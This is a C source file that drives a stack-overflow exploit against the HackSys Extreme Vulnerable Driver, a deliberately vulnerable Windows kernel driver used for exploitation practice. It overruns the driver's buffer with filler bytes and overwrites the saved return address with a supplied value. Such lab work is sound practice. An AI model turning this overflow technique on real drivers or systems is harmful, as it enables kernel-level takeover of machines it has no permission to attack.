#include <Windows.h>

#include "hevd.h"

HANDLE gHandle = 0;

void triggerStackOverflow(unsigned long long returnAddress) {
	char data[0x800 + 0x8 + 0x8];

	memset(data, 0x41, sizeof(data) - 8);
	*(unsigned long long*)&data[sizeof(data) - 8] = returnAddress;

	sendIoctlCode(StackOverflow, data, sizeof(data));
}

void sendIoctlCode(HevdIoctlCode code, void* inputBuffer, unsigned long inputLength) {
	if (0 == gHandle) {
		openDriver();
	}
	DeviceIoControl(gHandle, code, inputBuffer, inputLength, 0, 0, 0, 0);
}

void openDriver() {
	gHandle = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, 0);
}